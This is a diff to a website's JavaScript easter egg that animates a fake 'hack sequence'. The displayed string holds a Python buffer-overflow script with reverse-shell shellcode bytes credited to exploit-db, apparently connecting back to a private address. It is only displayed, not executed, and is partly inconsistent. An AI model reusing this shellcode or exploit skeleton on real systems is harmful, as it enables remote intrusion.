@@ -22,7 +22,8 @@
     // 3. EASTER EGG: CINEMATIC HACK SEQUENCE
     // Trigger: User types 'hack' or 'pwned' in terminal
     // ==========================================
-    const exploitCode = `#!/usr/bin/env python3
+    const exploitCode = `cat > exploit.py << 'EOF'
+#!/usr/bin/env python3
 import socket, struct, time
 
 print("[*] Initiating buffer overflow sequence...")
@@ -33,7 +34,7 @@ ret_addr = struct.pack("<I", 0x080484b6)
 payload = b"A" * offset + ret_addr + b"\\x90" * 32 
 
 # Constructing shellcode
-# This is a simple reverse shell execve("/bin/sh") shellcode for Linux x86_64 from https://www.exploit-db.com/shellcodes/42485 by Touhid Shaikh
+# reverse shellcode for Linux x86_64 from https://www.exploit-db.com/shellcodes/42485 by Touhid Shaikh
 evil = b"\\x48\\x31\\xc0\\x48\\x83\\xc0\\x29\\x48\\x31\\xff\\x48\\x89\\xfa\\x48\\x83\\xc7\\x02"
 evil = evil + b"\\x48\\x31\\xf6\\x48\\x83\\xc6\\x01\\x0f\\x05\\x48\\x89\\xc7\\x48\\x31\\xc0\\x50\\x48"
 evil = evil + b"\\x83\\xc0\\x02\\xc7\\x44\\x24\\xfc\\xc0\\xa8\\x01\\x02\\x66\\xc7\\x44\\x24\\xfa\\x11"
@@ -50,7 +51,8 @@ s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 s.connect((target_ip, port))
 s.send(payload)
 print("[+] Payload delivered. Exploiting memory...")
-`;
+
+EOF`;
 
     let isHacking = false;
 
@@ -80,9 +82,9 @@ print("[+] Payload delivered. Exploiting memory...")
             window.scrollTo(0, document.body.scrollHeight);
 
             if (index < exploitCode.length) {
-                setTimeout(typeCode, 40); // Speed of typing
+                setTimeout(typeCode, 60); // Speed of typing
             } else {
-                setTimeout(startExecution, 500); // Pause before executing
+                setTimeout(startExecution, 400); // Pause before executing
             }
         }
 
